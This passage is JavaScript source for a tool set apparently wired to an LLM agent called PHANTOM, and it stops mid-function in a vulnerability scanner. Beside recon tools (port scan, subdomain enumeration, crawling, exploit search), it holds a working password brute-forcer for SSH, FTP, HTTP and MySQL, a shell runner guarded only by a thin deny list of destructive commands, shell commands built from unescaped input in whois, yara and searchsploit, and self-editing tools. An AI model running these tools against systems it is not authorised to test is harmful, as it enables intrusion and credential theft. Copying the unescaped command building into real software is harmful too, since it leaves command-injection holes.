import fs from "fs";
import { resolve } from "path";
import { homedir } from "os";
import { pathToFileURL } from "url";
import { createRequire } from "module";
const $r = createRequire(import.meta.url);
import { BASE_DIR, MEMORY_DIR, REPORTS_DIR, PLAYBOOKS_DIR, KNOWLEDGE_DIR, BOOKS_DIR } from "./config.mjs";
import { __r, runExternal, formatExternal } from "./runtime.mjs";

export const hackerTools = {
  shell: async (cmd) => {
    // Execute a shell command and return output
    // Includes audit trail + dangerous command guard
    const SHELL_LOG = resolve(homedir(), ".config", "phantom", "shell_history.log");
    const dangerous = [/^rm\s+-rf\s+\/|rm\s+-rf\s+--no-preserve-root/, /^dd\s+if=/, /:\(\)\{/, /chmod\s+777\s+\/$/, /sudo\s+rm\s+-rf/, /bash\s+-c\s/, /sh\s+-c\s/];

    // Guard: unclosed backticks or $() cause shell syntax errors
    const backtickCount = (cmd.match(/`/g) || []).length;
    if (backtickCount % 2 !== 0) {
      return "[Shell Error] Unclosed backtick in command. Escape with backslash-backtick or use $() with balanced parentheses.";
    }
    // Escape backticks and $() to prevent shell injection / syntax errors
    cmd = cmd.replace(/`/g, '\\`').replace(/\$\(/g, '\\$\\(');

    const isDangerous = dangerous.some(d => d.test(cmd));
    const ts = new Date().toISOString();

    // Audit trail
    try {
      const dir = resolve(homedir(), ".config", "phantom");
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.appendFileSync(SHELL_LOG, `[${ts}] ${cmd}\n`, "utf-8");
    } catch { /* best-effort audit */ }

    // Dangerous command guard
    if (isDangerous) {
      return `[Shell] ⚠ Command blocked (dangerous pattern detected): ${cmd}\nLog: ${SHELL_LOG}\nUse --force to override (not recommended).`;
    }

    try {
      const { execSync } = await import("child_process");
      const r = execSync(cmd, { encoding: "utf-8", timeout: 30000, maxBuffer: 1024 * 1024 });
      return r.trim().substring(0, 4000) || "(empty output)";
    } catch (e) {
      return `[Shell Error] ${e.stderr?.substring(0, 500) || e.message}`;
    }
  },

  web_fetch: async (url) => {
    // Fetch a URL and return the content
    try {
      const r = await fetch(url);
      const text = await r.text();
      const ct = r.headers.get("content-type") || "";
      const isHtml = ct.includes("text/html");
      // Strip HTML tags for readability
      const cleaned = isHtml
        ? text.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "")
             .replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "")
             .replace(/<[^>]+>/g, " ")
             .replace(/\s+/g, " ")
             .trim()
        : text;
      return `Status ${r.status}\n${cleaned.substring(0, 15000)}`;
    } catch (e) {
      return `[Fetch Error] ${e.message}`;
    }
  },

  decode: async (input) => {
    // Auto-detect and decode encoded strings
    const s = input.trim();
    const results = [];
    // Base64
    try {
      const decoded = Buffer.from(s, "base64").toString("utf-8");
      if (/^[\x20-\x7E\s]+$/.test(decoded)) results.push(`base64: ${decoded}`);
    } catch {}
    // Hex
    const hexClean = s.replace(/\\x/g, "").replace(/0x/g, "").replace(/\s/g, "");
    if (/^[0-9a-fA-F]+$/.test(hexClean) && hexClean.length % 2 === 0) {
      try {
        const decoded = Buffer.from(hexClean, "hex").toString("utf-8");
        if (/^[\x20-\x7E\s]+$/.test(decoded)) results.push(`hex: ${decoded}`);
      } catch {}
    }
    // URL decode
    try { if (s.includes("%")) results.push(`url: ${decodeURIComponent(s)}`); } catch {}
    // Binary
    if (/^[01\s]+$/.test(s)) {
      try {
        const bin = s.replace(/\s/g, "");
        const chars = [];
        for (let i = 0; i < bin.length; i += 8) {
          chars.push(String.fromCharCode(parseInt(bin.substring(i, i+8), 2)));
        }
        results.push(`binary: ${chars.join("")}`);
      } catch {}
    }
    // ROT13
    results.push(`rot13: ${s.replace(/[a-zA-Z]/g, c => {
      const code = c.charCodeAt(0);
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(((code - base + 13) % 26) + base);
    })}`);
    return results.length ? results.join("\n") : "[Decoder] No known encoding detected";
  },

  file_analyze: async (path) => {
    // Analyze a file: hashes, entropy, strings, type detection
    try {
      const { existsSync, statSync, readFileSync } = await import("fs");
      if (!existsSync(path)) return `[Error] File not found: ${path}`;
      const buf = readFileSync(path);
      const size = buf.length;
      const { createHash } = await import("crypto");
      const md5 = createHash("md5").update(buf).digest("hex");
      const sha1 = createHash("sha1").update(buf).digest("hex");
      const sha256 = createHash("sha256").update(buf).digest("hex");
      // Entropy
      const freq = new Map();
      for (const b of buf) freq.set(b, (freq.get(b) || 0) + 1);
      let entropy = 0;
      for (const count of freq.values()) { const p = count / size; entropy -= p * Math.log2(p); }
      // Strings extraction
      let cur = "", strs = [];
      for (let i = 0; i < buf.length; i++) {
        const c = buf[i];
        if (c >= 32 && c <= 126) { cur += String.fromCharCode(c); }
        else { if (cur.length >= 6) strs.push(cur); cur = ""; }
      }
      if (cur.length >= 6) strs.push(cur);
      // File type via magic bytes
      const magic = buf.slice(0, 16).toString("hex");
      let fileType = "unknown";
      if (magic.startsWith("4d5a")) fileType = "PE (Windows executable/DLL)";
      else if (magic.startsWith("7f454c46")) fileType = "ELF (Linux binary)";
      else if (magic.startsWith("89504e47")) fileType = "PNG image";
      else if (magic.startsWith("ffd8")) fileType = "JPEG image";
      else if (magic.startsWith("504b0304")) fileType = "ZIP/PK archive";
      else if (magic.startsWith("25504446")) fileType = "PDF document";
      else if (magic.startsWith("d0cf11e0a1b11ae1")) fileType = "OLE2 (Office doc)";
      else if (magic.startsWith("1f8b")) fileType = "GZIP compressed";
      else if (magic.startsWith("424d")) fileType = "BMP image";
      else if (magic.startsWith("47494638")) fileType = "GIF image";
      else if (magic.startsWith("cafebabe")) fileType = "Java class";
      else if (magic.startsWith("52617221")) fileType = "RAR archive";
      else if (magic.startsWith("1f9d") || magic.startsWith("1fa0")) fileType = "Compress'd archive";
      else if (buf.slice(0, 3).toString() === "#!/") fileType = "Script";
      else if (buf.slice(0, 4).toString() === "MZ") fileType = "DOS executable";

      const entropyLabel = entropy > 7.2 ? "SUSPICIOUS - likely encrypted/packed malware" :
                           entropy > 6.5 ? "High - possible packing/encryption" :
                           entropy > 5.0 ? "Medium" : "Low (plain text/native code)";

      const sample = strs.slice(0, 25).join("\n").substring(0, 2000);

      return [
        `📁 ${path}`,
        `Size: ${(size / 1024).toFixed(1)} KB (${size} bytes)`,
        `Type: ${fileType}`,
        `Entropy: ${entropy.toFixed(4)} — ${entropyLabel}`,
        `MD5:    ${md5}`,
        `SHA1:   ${sha1}`,
        `SHA256: ${sha256}`,
        `── Strings (${strs.length} found, showing first 25) ──`,
        sample || "(no printable strings ≥6 chars)",
      ].join("\n");
    } catch (e) {
      return `[Analyze Error] ${e.message}`;
    }
  },

  dns_lookup: async (domain) => {
    // DNS resolution: A, AAAA, MX, NS, TXT records
    try {
      const dns = await import("dns/promises");
      const results = [`DNS records for ${domain}:`];
      const checks = [
        ["A", dns.resolve4(domain).catch(() => [])],
        ["AAAA", dns.resolve6(domain).catch(() => [])],
        ["MX", dns.resolveMx(domain).catch(() => [])],
        ["NS", dns.resolveNs(domain).catch(() => [])],
        ["TXT", dns.resolveTxt(domain).catch(() => [])],
        ["CNAME", dns.resolveCname(domain).catch(() => [])],
        ["SOA", dns.resolveSoa(domain).catch(() => [])],
      ];
      for (const [label, promise] of checks) {
        try {
          const val = await promise;
          if (Array.isArray(val) && val.length) {
            if (label === "MX") results.push(`  MX: ${val.map(m => `${m.exchange} (prio ${m.priority})`).join(", ")}`);
            else if (label === "TXT") results.push(`  TXT: ${val.flat().join(", ")}`);
            else if (label === "SOA") results.push(`  SOA: ${val.nsname} (admin: ${val.hostmaster})`);
            else results.push(`  ${label}: ${val.join(", ")}`);
          }
        } catch {}
      }
      if (results.length === 1) results.push("  (no records found)");
      return results.join("\n");
    } catch (e) {
      return `[DNS Error] ${e.message}`;
    }
  },

  hash: async (input) => {
    // Hash text or file with MD5/SHA1/SHA256
    try {
      const { createHash } = await import("crypto");
      const { existsSync, readFileSync } = await import("fs");
      let data;
      let label = "text";
      if (existsSync(input)) {
        data = readFileSync(input);
        label = `file (${input})`;
      } else {
        data = Buffer.from(input, "utf-8");
      }
      return [
        `Hash of ${label}:`,
        `MD5:    ${createHash("md5").update(data).digest("hex")}`,
        `SHA1:   ${createHash("sha1").update(data).digest("hex")}`,
        `SHA256: ${createHash("sha256").update(data).digest("hex")}`,
      ].join("\n");
    } catch (e) {
      return `[Hash Error] ${e.message}`;
    }
  },

  whois: async (domain) => {
    try {
      const { execSync } = await import("child_process");
      const r = execSync(`whois ${domain}`, { encoding: "utf-8", timeout: 15000, maxBuffer: 1024 * 1024 });
      const out = r.trim();
      if (!out) return "(empty whois result)";
      const lines = out.split("\n").filter(l => !l.startsWith("%") && !l.startsWith("#"));
      return lines.slice(0, 60).join("\n").substring(0, 4000);
    } catch (e) {
      return `[WHOIS Error] ${e.stderr?.substring(0, 500) || e.message}`;
    }
  },

  port_scan: async (target) => {
    const COMMON_PORTS = {
      21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
      80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
      143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
      1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 3306: "MySQL",
      3389: "RDP", 5432: "PG", 5900: "VNC", 5985: "WinRM", 5986: "WinRMS",
      6379: "Redis", 8080: "Proxy", 8443: "AltHTTPS", 9000: "PHP", 27017: "Mongo",
    };
    const parts = target.split(":");
    const host = parts[0];
    let ports = [];
    if (parts[1]) {
      if (parts[1].includes("-")) {
        const [s, e] = parts[1].split("-").map(Number);
        if (!isNaN(s) && !isNaN(e)) for (let i = s; i <= e; i++) ports.push(i);
      } else {
        ports = parts[1].split(",").map(Number).filter(n => !isNaN(n));
      }
    }
    if (!ports.length) ports = Object.keys(COMMON_PORTS).map(Number);
    const { default: net } = await import("net");
    const results = [`Port scan: ${host} (${ports.length} ports)`];
    for (let i = 0; i < ports.length; i += 20) {
      const batch = ports.slice(i, i + 20);
      await Promise.all(batch.map(port => new Promise(resolve => {
        const s = new net.Socket();
        s.setTimeout(2000);
        s.on("connect", () => { results.push(`  ${port}/tcp  open  ${COMMON_PORTS[port] || "?"}`); s.destroy(); resolve(); });
        s.on("error", () => resolve());
        s.on("timeout", () => { s.destroy(); resolve(); });
        s.connect(port, host);
      })));
    }
    if (results.length === 1) results.push("  (all filtered/closed)");
    return results.join("\n");
  },

  http_headers: async (url) => {
    try {
      const r = await fetch(url, { method: "HEAD", signal: AbortSignal.timeout(10000), redirect: "manual" });
      const h = [];
      r.headers.forEach((v, k) => h.push(`  ${k}: ${v}`));
      return `URL: ${url}\nStatus: ${r.status} ${r.statusText}\n── Headers ──\n${h.join("\n")}`;
    } catch (e) { return `[HTTP Header Error] ${e.message}`; }
  },

  ssl_check: async (host) => {
    const [hn, ps] = host.includes(":") ? host.split(":") : [host, "443"];
    const port = parseInt(ps) || 443;
    const { default: tls } = await import("tls");
    return new Promise(resolve => {
      const sock = tls.connect(port, hn, { servername: hn, rejectUnauthorized: false }, () => {
        const cert = sock.getPeerCertificate();
        const lines = [
          `SSL for ${hn}:${port}`,
          `Subject: ${cert.subject ? Object.entries(cert.subject).map(([k,v])=>`${k}=${v}`).join(", ") : "N/A"}`,
          `Issuer: ${cert.issuer ? Object.entries(cert.issuer).map(([k,v])=>`${k}=${v}`).join(", ") : "N/A"}`,
          `From: ${cert.valid_from || "N/A"}  To: ${cert.valid_to || "N/A"}`,
          `Serial: ${cert.serialNumber || "N/A"}`,
          `SHA256: ${cert.fingerprint256 || "N/A"}`,
          `SANs: ${(cert.subjectaltname||"").replace(/DNS:/g,"").split(", ").join(", ")}`,
        ];
        const days = cert.valid_to ? Math.floor((new Date(cert.valid_to) - Date.now())/86400000) : null;
        if (days !== null) lines.push(`Expires in ${days}d ${days < 0 ? "EXPIRED" : days < 30 ? "⚠ SOON" : "OK"}`);
        const ciph = sock.getCipher();
        if (ciph) lines.push(`Cipher: ${ciph.name} (${ciph.version})`);
        sock.end();
        resolve(lines.join("\n"));
      });
      sock.on("error", e => resolve(`[SSL Error] ${e.message}`));
      sock.setTimeout(10000, () => { sock.destroy(); resolve("[SSL Error] Timeout"); });
    });
  },

  sub_enum: async (domain) => {
    try {
      const clean = domain.replace(/^https?:\/\//,"").replace(/\/.*$/,"").trim();
      const r = await fetch(`https://crt.sh/?q=%25.${clean}&output=json`, {
        signal: AbortSignal.timeout(20000), headers: { "User-Agent": "Phantom/1.0" },
      });
      if (!r.ok) return `[crt.sh] HTTP ${r.status}`;
      const data = await r.json();
      if (!Array.isArray(data) || !data.length) return `(no subs for ${clean})`;
      const subs = [...new Set(data.flatMap(d => (d.name_value||"").split("\n")))].filter(s => s.endsWith(`.${clean}`) || s === clean).sort();
      return subs.length ? subs.join("\n") : `(no subs for ${clean})`;
    } catch (e) { return `[Sub Error] ${e.message}`; }
  },

  crawl: async (url) => {
    try {
      const r = await fetch(url, { signal: AbortSignal.timeout(15000) });
      const html = await r.text();
      const base = url.replace(/\/[^/]*$/, "");
      const links = new Set();
      const linkRe = /<a[^>]+href\s*=\s*["']([^"']+)["']/gi;
      let m;
      while ((m = linkRe.exec(html)) !== null) {
        let h = m[1].split("#")[0].split("?")[0];
        if (!h || h.startsWith("javascript:") || h.startsWith("mailto:")) continue;
        if (h.startsWith("//")) h = `https:${h}`;
        else if (h.startsWith("/")) try { h = new URL(h, url).href; } catch { continue; }
        else if (!h.startsWith("http")) h = `${base}/${h}`;
        try { links.add(new URL(h).href); } catch {}
      }
      const forms = [...html.matchAll(/<form[^>]+action\s*=\s*["']([^"']*)["'][^>]*>/gi)].map(m => m[1]);
      const scripts = [...html.matchAll(/<script[^>]+src\s*=\s*["']([^"']+)["']/gi)].map(m => m[1]);
      const lines = [
        `🌐 Crawl: ${url}`, `Status: ${r.status}`, `Type: ${r.headers.get("content-type")||"N/A"}`,
        `Links: ${links.size}`, ...[...links].slice(0,30).map(l => `  ${l}`),
      ];
      if (forms.length) lines.push(`Forms (${forms.length}):`, ...forms.slice(0,5).map(f => `  action="${f}"`));
      if (scripts.length) lines.push(`Scripts (${scripts.length}):`, ...scripts.slice(0,10).map(s => `  ${s}`));
      return lines.join("\n");
    } catch (e) { return `[Crawl Error] ${e.message}`; }
  },

  vt_check: async (hash) => {
    const key = process.env.VT_API_KEY || "";
    if (!key) return "[VT] Set VT_API_KEY env var (free: https://virustotal.com)";
    try {
      const r = await fetch(`https://www.virustotal.com/api/v3/files/${hash.trim()}`, {
        headers: { "x-apikey": key, Accept: "application/json" },
        signal: AbortSignal.timeout(15000),
      });
      if (r.status === 404) return `[VT] Hash "${hash}" not found`;
      if (!r.ok) return `[VT] HTTP ${r.status}`;
      const d = (await r.json())?.data?.attributes || {};
      const st = d.last_analysis_stats || {};
      const res = d.last_analysis_results || {};
      const mal = st.malicious || 0, sus = st.suspicious || 0, harm = st.harmless || 0, und = st.undetected || 0;
      const lines = [
        `🔬 VT: ${hash}`, `File: ${d.meaningful_name || "N/A"}`, `Type: ${d.type_description || d.type || "N/A"}`,
        `Size: ${d.size||"N/A"}b`, `First: ${d.first_submission_date ? new Date(d.first_submission_date*1000).toISOString().split("T")[0] : "N/A"}`,
        `Detect: ${mal} mal / ${sus} sus / ${harm} harm / ${und} und (${mal+sus+harm+und} engines)`,
      ];
      for (const [eng, r2] of Object.entries(res)) if (r2.category === "malicious") lines.push(`  ${eng}: ${r2.result}`);
      if (d.names) { lines.push(`Names:`); d.names.slice(0,10).forEach(n => lines.push(`  ${n}`)); }
      return lines.join("\n");
    } catch (e) { return `[VT Error] ${e.message}`; }
  },

  yara: async (input) => {
    const parts = input.split("|").map(s => s.trim());
    const [rules, target] = parts.length >= 2 ? parts : ["", parts[0]];
    try {
      const r = (await import("child_process")).execSync(
        rules ? `yara ${rules} ${target}` : `yara ${target}`,
        { encoding: "utf-8", timeout: 30000, maxBuffer: 1024 * 1024 }
      ).trim();
      return r ? `YARA: ${target}\n${r}` : "(no YARA matches)";
    } catch (e) {
      const err = e.stderr?.toString() || e.message || "";
      if (err.includes("command not found")) return "[YARA] Install: apt install yara";
      if (e.status === 0) return "(no YARA matches)";
      return `[YARA Error] ${err.substring(0,500)}`;
    }
  },

  recon: async (target) => {
    const domain = target.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    const lines = [
      "╔══════════════════════════════════════╗",
      "║  PHANTOM AUTOMATED RECON            ║",
      `║  Target: ${domain.padEnd(32)}║`,
      `║  Date:   ${ts.slice(0, 19).padEnd(27)}║`,
      "╚══════════════════════════════════════╝", "",
    ];
    try { lines.push("── [1/7] WHOIS ──", await hackerTools.whois(domain)); } catch {}
    try { lines.push("\n── [2/7] DNS ──", await hackerTools.dns_lookup(domain)); } catch {}
    try { lines.push("\n── [3/7] SUBDOMAINS ──", await hackerTools.sub_enum(domain)); } catch {}
    try { lines.push("\n── [4/7] HTTP HEADERS ──", await hackerTools.http_headers(`https://${domain}`)); } catch {}
    try { lines.push("\n── [5/7] SSL ──", await hackerTools.ssl_check(domain)); } catch {}
    try { lines.push("\n── [6/7] PORTS ──", await hackerTools.port_scan(domain)); } catch {}
    try { lines.push("\n── [7/7] CRAWL ──", await hackerTools.crawl(`https://${domain}`)); } catch {}
    if (!fs.existsSync(REPORTS_DIR)) fs.mkdirSync(REPORTS_DIR, { recursive: true });
    const reportPath = resolve(REPORTS_DIR, `recon_${domain}_${ts}.md`);
    fs.writeFileSync(reportPath, lines.join("\n"), "utf-8");
    lines.push(`\n📄 Report saved: ${reportPath}`);
    return lines.join("\n");
  },

  cve_search: async (query) => {
    try {
      const r = await fetch(
        `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(query)}&resultsPerPage=12`,
        { signal: AbortSignal.timeout(20000), headers: { "User-Agent": "Phantom/1.0" } }
      );
      if (!r.ok) return `[NVD] HTTP ${r.status}`;
      const data = await r.json();
      const vulns = data?.vulnerabilities || [];
      if (!vulns.length) return `(no CVEs for "${query}")`;
      const lines = [`🔍 CVEs for "${query}": ${vulns.length} found\n`];
      for (const v of vulns.slice(0, 15)) {
        const c = v.cve || {};
        const id = c.id || "N/A";
        const desc = c.descriptions?.find(d => d.lang === "en")?.value || "";
        const cvss = c.metrics?.cvssMetricV31?.[0]?.cvssData || c.metrics?.cvssMetricV2?.[0]?.cvssData || {};
        lines.push(`[${id}] ${cvss.baseSeverity || "?"} (${cvss.baseScore || "?"}) — ${(c.published||"").split("T")[0] || "?"}`);
        if (desc) lines.push(`  ${desc.substring(0, 180)}`);
        lines.push(`  https://nvd.nist.gov/vuln/detail/${id}\n`);
      }
      return lines.join("\n");
    } catch (e) { return `[CVE Error] ${e.message}`; }
  },

  searchsploit: async (query) => {
    try {
      const r = (await import("child_process")).execSync(`searchsploit ${query} 2>/dev/null`, { encoding: "utf-8", timeout: 15000 });
      if (r.trim()) return `🔧 Exploit-DB:\n${r.trim().substring(0, 4000)}`;
    } catch {}
    try {
      const r = await fetch(`https://packetstormsecurity.com/search/?q=${encodeURIComponent(query)}`, { signal: AbortSignal.timeout(15000), headers: { "User-Agent": "Mozilla/5.0" } });
      const html = await r.text();
      const lines = [`🔧 Exploits for "${query}":`];
      const matches = html.match(/<a[^>]+href="\/files\/[^"]+"[^>]*>[\s\S]{0,150}?<\/a>/gi) || [];
      for (const m of matches.slice(0, 15)) {
        const url = m.match(/href="([^"]+)"/)?.[1];
        const text = m.replace(/<[^>]+>/g, "").trim().substring(0, 100);
        if (url && text) lines.push(`  ${text} → https://packetstormsecurity.com${url}`);
      }
      return lines.length > 1 ? lines.join("\n") : `  Try: https://www.exploit-db.com/search?q=${encodeURIComponent(query)}`;
    } catch (e) { return `[Search Error] ${e.message}`; }
  },

  bruteforce: async (input) => {
    const parts = input.split("|").map(s => s.trim());
    if (parts.length < 4) return `[Brute] Usage: protocol|target|user|pass1,pass2,pass3\nProtocols: ssh, ftp, http, mysql`;
    const [protocol, target, user, passStr] = parts;
    const passes = passStr.split(",").map(s => s.trim()).filter(Boolean);
    const results = [`🔑 Brute: ${protocol}://${target}`, `  User: ${user}`, `  Passwords: ${passes.length}`, ""];
    const { default: net } = await import("net");

    async function tryOne(protocol, target, user, pass) {
      switch (protocol) {
        case "ssh": {
          try {
            (await import("child_process")).execSync(
              `sshpass -p '${pass.replace(/'/g, "'\\''")}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${user}@${target} 'id' 2>/dev/null`,
              { encoding: "utf-8", timeout: 10000 }
            );
            return "✅ SUCCESS";
          } catch { return "❌ failed"; }
        }
        case "ftp": {
          return new Promise(resolve => {
            const s = new net.Socket(); let buf = "";
            s.setTimeout(5000);
            s.on("data", d => {
              buf += d.toString();
              if (buf.includes("220 ") || buf.includes("ready")) s.write(`USER ${user}\r\n`);
              else if (buf.includes("331 ") || buf.includes("User")) s.write(`PASS ${pass}\r\n`);
              else if (buf.includes("230 ") || buf.includes("Logged")) { s.destroy(); resolve("✅ SUCCESS"); }
              else if (buf.includes("530 ") || buf.includes("Login") || buf.includes("incorrect")) { s.destroy(); resolve("❌ failed"); }
            });
            s.on("error", () => resolve("❌ error"));
            s.on("timeout", () => { s.destroy(); resolve("❌ timeout"); });
            const [h, p] = target.includes(":") ? target.split(":") : [target, "21"];
            s.connect(parseInt(p) || 21, h);
          });
        }
        case "http": {
          try {
            const r = await fetch(target, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ username: user, password: pass, log: user, pwd: pass }).toString(), redirect: "manual", signal: AbortSignal.timeout(8000) });
            if (r.status === 302 || r.status === 301) return "✅ redirect";
            const t = await r.text().catch(() => "");
            if (r.status === 200 && !t.includes("incorrect") && !t.includes("Invalid") && !t.includes("error")) return !t.includes("password") && !t.includes("login") ? "⚠ maybe" : "❌ failed";
            return r.status === 401 || r.status === 403 ? "❌ denied" : "❌ failed";
          } catch { return "❌ error"; }
        }
        case "mysql": {
          try {
            const r = (await import("child_process")).execSync(
              `mysql -u '${user}' -p'${pass.replace(/'/g, "'\\''")}' -h '${target}' -e 'SELECT 1' --connect-timeout=5 2>/dev/null`, { encoding: "utf-8", timeout: 10000 }
            );
            return r.includes("1") ? "✅ SUCCESS" : "❌ failed";
          } catch { return "❌ failed"; }
        }
        default: return "❌ unknown";
      }
    }

    const pad = `${user}:`.padEnd(25);
    for (const pass of passes) {
      const r = await tryOne(protocol, target, user, pass);
      results.push(`  ${pad} ${pass.padEnd(20)} → ${r}`);
      if (r.startsWith("✅") || r.startsWith("⚠")) { results.push(`\n🎯 FOUND: ${user}:${pass}`); break; }
    }
    return results.join("\n");
  },

  // ── FILE TOOLS ──
  file_read: async (path) => {
    try {
      const resolved = resolve(path);
      if (!fs.existsSync(resolved)) return `[File Error] Not found: ${path}`;
      const content = fs.readFileSync(resolved, "utf-8");
      if (content.length > 100000) return `[File Error] Too large (>100KB): ${path} (${content.length} chars)`;
      return content;
    } catch (e) {
      if (e.code === "EISDIR") return `[File Error] Is a directory: ${path}`;
      return `[File Error] ${e.message}`;
    }
  },

  file_write: async (input) => {
    const idx = input.indexOf("|");
    if (idx === -1) return "[File Write] Usage: path|content";
    const path = input.substring(0, idx).trim();
    const content = input.substring(idx + 1);
    if (!path || !content) return "[File Write] Usage: path|content";
    try {
      const resolved = resolve(path);
      const dir = resolve(resolved, "..");
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      const existed = fs.existsSync(resolved);
      const prevSize = existed ? fs.statSync(resolved).size : 0;
      fs.writeFileSync(resolved, content, "utf-8");
      const preview = content.substring(0, 120).replace(/\n/g, "⏎ ").trim();
      const lines = content.split("\n").length;
      return `✅ ${existed ? "Updated" : "Created"} ${resolved}\n   ${content.length}b / ${lines} lines\n   ${existed ? `${prevSize}b → ${content.length}b` : `new file`}\n   ${preview}${content.length > 120 ? "..." : ""}`;
    } catch (e) { return `[File Write Error] ${e.message}`; }
  },

  file_edit: async (input) => {
    const parts = input.split("|");
    if (parts.length < 3) return "[File Edit] Usage: path|old_string|new_string";
    const [path, oldStr, ...rest] = parts;
    const newStr = rest.join("|");
    try {
      const resolved = resolve(path);
      if (!fs.existsSync(resolved)) return `[File Edit] Not found: ${path}`;
      let content = fs.readFileSync(resolved, "utf-8");
      if (!content.includes(oldStr)) return `[File Edit] String not found`;
      const idx = content.indexOf(oldStr);
      const ctxBefore = content.substring(Math.max(0, idx - 60), idx).split("\n").pop() || "";
      const ctxAfter = content.substring(idx, idx + oldStr.length + 60).split("\n")[0] || "";
      content = content.replace(oldStr, newStr);
      fs.writeFileSync(resolved, content, "utf-8");
      const newPreview = content.substring(idx, idx + newStr.length + 40).split("\n")[0] || "";
      return `✅ Edited ${path}\n  ─ ${ctxBefore.trim()}\n  + ${newPreview.trim().substring(0, 80)}\n  ${oldStr.length}b → ${newStr.length}b`;
    } catch (e) { return `[File Edit Error] ${e.message}`; }
  },

  file_search: async (input) => {
    const parts = input.split("|").map(s => s.trim());
    const searchPath = parts.length >= 2 ? parts[0] : ".";
    const pattern = parts.length >= 2 ? parts[1] : parts[0];
    if (!pattern) return "[File Search] Usage: [path|]pattern";
    try {
      const { execSync } = await import("child_process");
      const r = execSync(`rg -rn '${pattern.replace(/'/g, "'\\''")}' '${searchPath}' 2>/dev/null | head -40`, { encoding: "utf-8", timeout: 15000 });
      if (!r.trim()) return `(no matches for "${pattern}" in ${searchPath})`;
      const lines = r.trim().split("\n");
      return `🔍 "${pattern}" in ${searchPath}: ${lines.length} matches\n${lines.slice(0, 40).join("\n")}`;
    } catch { return `(no matches for "${pattern}" in ${searchPath})`; }
  },

  file_list: async (path) => {
    try {
      const resolved = resolve(path || ".");
      if (!fs.existsSync(resolved)) return `[File List] Not found: ${path}`;
      const entries = fs.readdirSync(resolved, { withFileTypes: true });
      const lines = [`📁 ${resolved}:`];
      const dirs = [], files = [];
      for (const e of entries) {
        if (e.name.startsWith(".")) continue;
        if (e.isDirectory()) dirs.push(e.name);
        else files.push(e.name);
      }
      dirs.sort().forEach(d => lines.push(`  📁 ${d}/`));
      files.sort().forEach(f => { try { const s = fs.statSync(resolve(resolved, f)); lines.push(`  📄 ${f} (${s.size.toLocaleString()}b)`); } catch { lines.push(`  📄 ${f}`); } });
      lines.push(`\n${dirs.length} dirs, ${files.length} files`);
      return lines.join("\n");
    } catch (e) { return `[File List Error] ${e.message}`; }
  },

  // ── SELF TOOLS ──
  self_info: async () => {
    try {
      const phantomDir = process.cwd();
      const pkg = fs.existsSync(resolve(phantomDir, "package.json"))
        ? JSON.parse(fs.readFileSync(resolve(phantomDir, "package.json"), "utf-8")) : {};
      const names = Object.keys(hackerTools).sort();
      const llmAvail = __r.llmInstance?.hasLLM;
      const llmName = __r.llmInstance?.provider || __r.PHANTOM_LLM_PROVIDER || "openai";
      return [
        `╔══════════════════════════════════════╗`,
        `║  PHANTOM — Cybersecurity Assistant   ║`,
        `╚══════════════════════════════════════╝`,
        ``,
        `Version:  ${pkg.version || "dev"}`,
        `Runtime:  Node.js ${process.version}`,
        `Platform: ${process.platform} ${process.arch}${__r.ENV.isProot ? " 🔒 PRoot" : ""}${__r.ENV.isTermux ? " 📱 Termux" : ""}`,
        `Project:  ${phantomDir}`,
        ``,
        `📦 ${names.length} Tools:`,
        `  ${names.join(", ")}`,
        ``,
        `🤖 ${llmAvail ? `LLM: ${llmName}` : "LLM: Not connected (set API key with @llm_config)"}`,
      ].join("\n");
    } catch (e) { return `[Self Info Error] ${e.message}`; }
  },

  self_read: async (path) => {
    try {
      const phantomDir = process.cwd();
      const resolved = resolve(phantomDir, path.replace(/^\.\//, ""));
      if (!resolved.startsWith(phantomDir)) return `[Self Read] Access denied: path outside project`;
      if (!fs.existsSync(resolved)) return `[Self Read] Not found: ${path}`;
      const content = fs.readFileSync(resolved, "utf-8");
      if (content.length > 50000) return content.substring(0, 50000) + `\n... (truncated, ${content.length} chars total)`;
      return content;
    } catch (e) { return `[Self Read Error] ${e.message}`; }
  },

  self_edit: async (input) => {
    const parts = input.split("|");
    if (parts.length < 3) return "[Self Edit] Usage: relative_path|old_string|new_string";
    const [relPath, oldStr, ...rest] = parts;
    const newStr = rest.join("|");
    try {
      const phantomDir = process.cwd();
      const resolved = resolve(phantomDir, relPath.replace(/^\.\//, ""));
      if (!resolved.startsWith(phantomDir)) return `[Self Edit] Access denied: path outside project`;
      if (!fs.existsSync(resolved)) return `[Self Edit] Not found: ${relPath}`;
      let content = fs.readFileSync(resolved, "utf-8");
      if (!content.includes(oldStr)) return `[Self Edit] String not found`;
      const idx = content.indexOf(oldStr);
      const ctxBefore = content.substring(Math.max(0, idx - 60), idx);
      const ctxAfter = content.substring(idx, idx + oldStr.length + 60);
      content = content.replace(oldStr, newStr);
      fs.writeFileSync(resolved, content, "utf-8");
      const diffLine = ctxBefore.split("\n").pop() || "";
      const aftLine = ctxAfter.substring(0, 60).split("\n")[0] || "";
      const newPreview = content.substring(idx, idx + newStr.length + 40).split("\n")[0] || "";
      return `✅ Edited ${relPath}\n  ─ ${diffLine.trim()}\n  + ${newPreview.trim().substring(0, 80)}\n  ${oldStr.length}b → ${newStr.length}b`;
    } catch (e) { return `[Self Edit Error] ${e.message}`; }
  },

  // ── VULN SCAN ──
  vuln_scan: async (target) => {
    const domain = target.replace(/^https?:\/\//, "").replace(/\/.*$/, "").trim();
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    const lines = [`# Phantom Vulnerability Scan Report`, `**Target:** ${domain}`, `**Date:** ${new Date().toUTCString()}`, `---`, ``];
    // Phase 1
    lines.push(`## Phase 1: Reconnaissance\n`);
